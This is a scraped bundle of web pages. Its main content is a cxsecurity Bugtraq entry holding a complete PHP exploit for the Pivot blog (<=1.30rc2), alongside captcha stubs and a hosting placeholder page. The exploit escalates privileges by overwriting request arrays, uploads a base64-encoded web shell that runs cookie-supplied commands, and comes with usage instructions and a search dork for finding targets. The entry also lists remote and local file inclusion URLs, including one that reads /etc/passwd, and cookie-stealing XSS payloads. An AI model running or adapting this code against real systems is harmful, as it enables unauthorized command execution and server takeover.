=== Content from cxsecurity.com_0d27baa8_20250126_122045.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from cxsecurity.com_1e0cb5bf_20250126_122043.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from securityreason.com_36675bc5_20250125_221130.html ===

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **Pivot <=1.30rc2 privilege escalation / remote commands execution** **2006.07.14** Credit:  **[rgod](https://cxsecurity.com/author/rgod/1/)**  Risk: **High** Local: **No** Remote: ****Yes**** CVE: **[CVE-2006-3533](https://cxsecurity.com/cveshow/CVE-2006-3533/ "Click to see CVE-2006-3533")** | **[CVE-2006-3532](https://cxsecurity.com/cveshow/CVE-2006-3532/ "Click to see CVE-2006-3532")** | **[CVE-2006-3531](https://cxsecurity.com/cveshow/CVE-2006-3531/ "Click to see CVE-2006-3531")** CWE: **N/A** | | --- | |
| --- | --- | --- | --- |

#!/usr/bin/php -q -d short\_open\_tag=on
<?
echo "Pivot <= 1.30 RC2 privileges escalation / remote commands execution exploitn";
echo "by rgod rgod (at) autistici (dot) org [email concealed]n";
echo "site: http://retrogod.altervista.orgn";
echo "dorks: "Powered byPivot"n";
echo "version specific: "Powered byPivot - 1.30 RC2" +Rippersnappernn";
/\*
works with register\_globals=On
\*/
if ($argc<4) {
echo "Usage: php ".$argv[0]." host path cmd OPTIONSn";
echo "host: target server (ip/hostname)n";
echo "path: path to the blogn";
echo "cmd: a shell commandn";
echo "Options:n";
echo " -p[port]: specify a port other than 80n";
echo " -P[ip:port]: specify a proxyn";
echo "Examples:n";
echo "php ".$argv[0]." localhost /blog/ ls -la -p81n";
echo "php ".$argv[0]." localhost /blog/ ls -la -P1.1.1.1:80nn";
die;
}
/\* software site: http://www.pivotlog.net/
i) vulnerable code in pv\_core.php at line 23-24 and in CheckLogin() function:
...
// some global initialisation stuff
$Pivot\_Vars = array\_merge($\_GET , $\_POST, $\_SERVER);
...
function CheckLogin() {
global $Users, $Pivot\_Vars, $Cfg;
// User is banned..
if(isset($Cfg['bn\_' . $\_SERVER['REMOTE\_ADDR']])){
Login(1, 1, "User is banned");
}
// added to not check for referers if no session id is given..
if(!isset($Pivot\_Vars['session'])){ <-------------[!]
$uri = 'http://' . $Pivot\_Vars['HTTP\_HOST'] . $Pivot\_Vars['SCRIPT\_NAME'];
if(strpos($Pivot\_Vars['HTTP\_REFERER'], $uri)!=0){
$Pivot\_Vars['user'] = '';
Login(0, 2, "No session active.");
}
}
// If we selected logout from the menu..
if( isset($Pivot\_Vars['func']) && ($Pivot\_Vars['func'] == 'login') && isset($Pivot\_Vars['do']) && ($Pivot\_Vars['do'] == 'logout')){
setcookie('user', '', -9999,"/");
setcookie('pass', '', -9999,"/");
setcookie('mode', 'nothing', -9999,"/");
unset($Users[$Cfg['tempsessions'][$Pivot\_Vars['session']][0]]['session']
);
unset($Cfg['tempsessions'][$Pivot\_Vars['session']]);
SaveSettings();
login(0,3, "User logged off");
}
// if the user has cookies set, but no session is active yet..
if( isset($\_COOKIE['user']) && isset($\_COOKIE['hash']) && ($\_COOKIE['mode'] == 'stayloggedin') && <----------- [!!!]
( (!isset($Pivot\_Vars['session'])) || ($Pivot\_Vars['session'] == "")) ) {
debug("attempted ReviveSession..");
// Try to revive an old Session..
ReviveSession();
} else if(($Pivot\_Vars['func'] == 'login') || ($Pivot\_Vars['do'] == 'login')) {
// if we've just logged in, reset the cookies, if necesary and start a new session..
debug("attempted login..");
if ( ($Users[$Pivot\_Vars['user']]['pass'] == md5($Pivot\_Vars['pass'])) <-------------- [!!!!]
&& ($Users[$Pivot\_Vars['user']]['userlevel']>0) ) {
NewSession($Pivot\_Vars['user']);
}else{
// add one to the failed login attempts.
if(strlen($Pivot\_Vars['user']) > 0) {
$Cfg['fl\_' . $\_SERVER['REMOTE\_ADDR']]++;
}
Login(1,4, "Incorrect username or password");
}
} else {
// when running normally, the session stuff is updated.
$Pivot\_Vars['user'] = $Cfg['tempsessions'][$Pivot\_Vars['session']][0];
$ip = substr( $\_SERVER['REMOTE\_ADDR'], 0, strrpos( $\_SERVER['REMOTE\_ADDR'], "."));
// calculated locally: user's pass + current session + ip we got from user
$hash1 = md5( md5( $Users[$Pivot\_Vars['user']]['pass'] . $Pivot\_Vars['session'] ) . $ip ) ;
// stored hash
$hash2 = $Cfg['tempsessions'][$Pivot\_Vars['session']][1];
// we check if the two hash matches with the one that was stored
if ($hash1 != $hash2) {
// if this is the case, something's not ok, so go back to login..
Login(0,0, "No hacking, please");
}
}
// If by this point no session is set, we will show the login screen..
if(strlen($Pivot\_Vars['session']) == 0) {
Login(0,8, "Please log on. (if you keep getting this message, delete the cookies for this site)");
}
// Update the timer, so we can keep the user logged in.
if($Cfg['tempsessions'][$Pivot\_Vars['session']][2] - time() <= ($Cfg['session\_length'] / 4)) {
$Cfg['tempsessions'][$Pivot\_Vars['session']][2] = $Cfg['tempsessions'][$Pivot\_Vars['session']][2] + $Cfg['session\_length'];
}
}
...
a remote user can overwrite $Pivot\_Vars array and, if register\_globals=on,
$Users one, to escalate privileges, then he can upload php files in images/ folder
through the includes/editor/insert\_image.php script
ii)
arbitrary remote inclusion (on php5) with register\_globals=On
http://[target]/pivot/includes/edit\_new.php?Paths[extensions\_path]=ftp:/
/username:password (at) somehost (dot) com [email concealed]/
where on somehost.com we have a
hooks/pre\_editor\_normal.php with some shellcode inside
and local inclusion with register\_globals=On & magic\_quotes\_gpc=Off
http://[target]/pivot/includes/edit\_new.php?Paths[extensions\_path]=/etc/
passwd%00
iii) various xss with register\_globals=On:
http://[target]/[path]/pivot/includes/blogroll.php?fg=[XSS]
http://[target]/[path]/pivot/includes/blogroll.php?line1=[XSS]
http://[target]/[path]/pivot/includes/blogroll.php?line2=[XSS]
http://[target]/[path]/pivot/includes/blogroll.php?bg=[XSS]
http://[target]/[path]/pivot/includes/blogroll.php?c1=[XSS]
http://[target]/[path]/pivot/includes/blogroll.php?c2=[XSS]
http://[target]/[path]/pivot/includes/blogroll.php?c3=[XSS]
http://[target]/[path]/pivot/includes/blogroll.php?c4=[XSS]
http://[target]/[path]/pivot/includes/editor/edit\_menu.php?name=[XSS]
http://[target]/[path]/pivot/includes/editor/edit\_menu.php?js\_name=[XSS]
iv) regardless of magic\_quotes\_gpc, xss:
http://[target]/[path]/pivot/includes/photo.php?h=><script>alert(documen
t.cookie)</script>
http://[target]/[path]/pivot/includes/photo.php?w=><script>alert(documen
t.cookie)</script>
this is the poc exploit tool for i)
\*/
error\_reporting(0);
ini\_set("max\_execution\_time",0);
ini\_set("default\_socket\_timeout",5);
function quick\_dump($string)
{
$result='';$exa='';$cont=0;
for ($i=0; $i<=strlen($string)-1; $i++)
{
if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
{$result.=" .";}
else
{$result.=" ".$string[$i];}
if (strlen(dechex(ord($string[$i])))==2)
{$exa.=" ".dechex(ord($string[$i]));}
else
{$exa.=" 0".dechex(ord($string[$i]));}
$cont++;if ($cont==15) {$cont=0; $result.="rn"; $exa.="rn";}
}
return $exa."rn".$result;
}
$proxy\_regex = '(bd{1,3}.d{1,3}.d{1,3}.d{1,3}:d{1,5}b)';
function sendpacketii($packet)
{
global $proxy, $host, $port, $html, $proxy\_regex;
if ($proxy=='') {
$ock=fsockopen(gethostbyname($host),$port);
if (!$ock) {
echo 'No response from '.$host.':'.$port; die;
}
}
else {
$c = preg\_match($proxy\_regex,$proxy);
if (!$c) {
echo 'Not a valid proxy...';die;
}
$parts=explode(':',$proxy);
echo "Connecting to ".$parts[0].":".$parts[1]." proxy...rn";
$ock=fsockopen($parts[0],$parts[1]);
if (!$ock) {
echo 'No response from proxy...';die;
}
}
fputs($ock,$packet);
if ($proxy=='') {
$html='';
while (!feof($ock)) {
$html.=fgets($ock);
}
}
else {
$html='';
while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
$html.=fread($ock,1);
}
}
fclose($ock);
#debug
#echo "rn".$html;
}
$host=$argv[1];
$path=$argv[2];
$cmd="";
$port=80;
$proxy="";
for ($i=3; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
{$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
$port=str\_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
$proxy=str\_replace("-P","",$argv[$i]);
}
}
$cmd=urlencode($cmd);
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
$magic\_var="suntzu"; //no matter how you call him
$shell="error\_reporting(0);if(get\_magic\_quotes\_gpc()){$\_COOKIE["cmd"]
=stripslashes($\_COOKIE["cmd"]);}set\_time\_limit(0);echo "my\_delim";passthru($\_COOKIE["cmd"]);echo "my\_delim";";
$shell=base64\_encode($shell);
$data='-----------------------------7d62702f250530
Content-Disposition: form-data; name="userfile"; filename="cfg.php";
Content-Type: text/plain
<?php;eval(base64\_decode("'.$shell.'"));?>
-----------------------------7d62702f250530--
';
$packet="POST ".$p."pivot/includes/editor/insert\_image.php?session=".$magic\_var."&func
=login&pass=".$magic\_var."&user=".$magic\_var."&Users[".$magic\_var."][pas
s]=".md5($magic\_var)."&Users[".$magic\_var."][userlevel]=1 HTTP/1.0rn";
$packet.="User-Agent: Googlebot/2.1rn";
$packet.="Host: ".$host."rn";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d62702f250530rn";
$packet.="Content-Length: ".strlen($data)."rn";
$packet.="Cookie: hash=; mode=stayloggedin; user=;rn";
$packet.="Connection: Closernrn";
$packet.=$data;
sendpacketii($packet);
sleep(1);
//shell.php is renamed to shell.php.php
$packet="GET ".$p."images/cfg.php.php HTTP/1.0rn";
$packet.="User-Agent: Googlebot/2.1rn";
$packet.="Host: ".$host."rn";
$packet.="Cookie: cmd=".$cmd.";rn";
$packet.="Connection: Closernrn";
sendpacketii($packet);
if (strstr($html,"my\_delim"))
{
$temp=explode("my\_delim",$html);
die("exploit succeeded...nn".$temp[1]);
}
//if you are here...
echo "exploit failed...";
?>
original url: http://retrogod.altervista.org/pivot\_130RC2\_xpl.html

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2006070065)
[Tweet](https://twitter.com/share)

Vote for this issue:

 0
 0

50%
50%

#### **Thanks for you vote!**

#### **Thanks for you comment!**Your message is in quarantine 48 hours.

Comment it here.
Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  | **{{ x.nick }}**  | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---  {{ x.comment }} |
| --- | --- |

Show all comments

---

Copyright **2025**, cxsecurity.com

  |  |
Back to Top



=== Content from cxsecurity.com_03f78148_20250126_122044.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from www.vupen.com_b20a2bac_20250125_221131.html ===

[![](/__ovh/common/img/logo-white.png)](https://www.ovhcloud.com/)

![](/__ovh/common/img/icon-traffic-cone.png)

# Site en construction

![](/__ovh/common/img/shadow.png)

Besoin d'assistance ou d'informations ?

[![](/__ovh/common/img/icon-book.png)
Guides](https://docs.ovh.com/fr/hosting/ "Guides")
[![](/__ovh/common/img/icon-speech-bubble.png)
Forum](https://community.ovh.com/ "Forum")
[![](/__ovh/common/img/icon-user-support.png)
Contact](https://help.ovhcloud.com/fr/ "Contact")
[![](/__ovh/common/img/icon-app-gear.png)
Espace Client](https://www.ovh.com/manager/ "Espace Client")

© Copyright 1999 [OVHcloud](https://www.ovhcloud.com/)

v1v2v3v4v5v6v7v8v9v10v11v12v13v14v15v16v17v18v19v20v21v22v23v24v25v26v27v28v29v30v31v32v33v34v35v36v37v38v39v40v41v42v43v44v45v46v47v48v49v50v51v52v53v54v55v56v57v58v59v60v61v62v63v64v65v66v67v68v69v70

u1u2u3u4u5u6u7u8u9u10u11u12u13u14u15u16u17u18u19u20u21u22u23u24u25u26u27u28u29u30u31u32u33u34u35u36u37u38u39u40u41u42u43u44u45u46u47u48u49u50u51u52u53u54u55u56u57u58u59u60u61u62u63u64u65u66u67u68u69

p1p2p3p4p5p6p7p8p9p10p11p12p13p14p15p16p17p18p19p20p21p22p23p24p25p26p27p28p29p30p31p32p33p34p35p36p37p38p39p40p41p42p43p44p45p46p47p48p49p50p51p52p53p54p55p56p57p58p59p60p61p62p63p64

e1e2e3e4e5e6e7e8e9e10e11e12e13e14e15e16e17e18e19e20e21e22e23e24e25e26e27e28e29e30e31e32e33e34e35e36e37e38e39e40e41e42e43e44e45e46e47e48e49e50e51e52e53

n1n2n3n4n5n6n7n8n9n10n11n12n13n14n15n16n17n18n19n20n21n22n23n24n25n26n27n28n29n30n31n32n33n34n35n36n37n38n39n40n41n42n43n44n45n46n47n48n49n50n51n52n53n54n55n56n57n58n59n60n61n62

---

c1c2c3c4c5c6c7c8c9c10c11c12c13c14c15c16c17c18c19c20c21c22c23c24c25c26c27c28c29c30c31c32c33c34c35c36c37c38c39c40c41c42c43c44c45c46c47c48c49c50c51

o1o2o3o4o5o6o7o8o9o10o11o12o13o14o15o16o17o18o19o20o21o22o23o24o25o26o27o28o29o30o31o32o33o34o35o36o37o38o39o40o41o42o43o44o45o46o47o48o49o50o51o52o53o54o55o56o57o58o59o60o61o62o63

m1m2m3m4m5m6m7m8m9m10m11m12m13m14m15m16m17m18m19m20m21m22m23m24m25m26m27m28m29m30m31m32m33m34m35m36m37m38m39m40m41m42m43m44m45m46m47m48m49m50m51m52m53m54m55m56m57m58m59m60m61


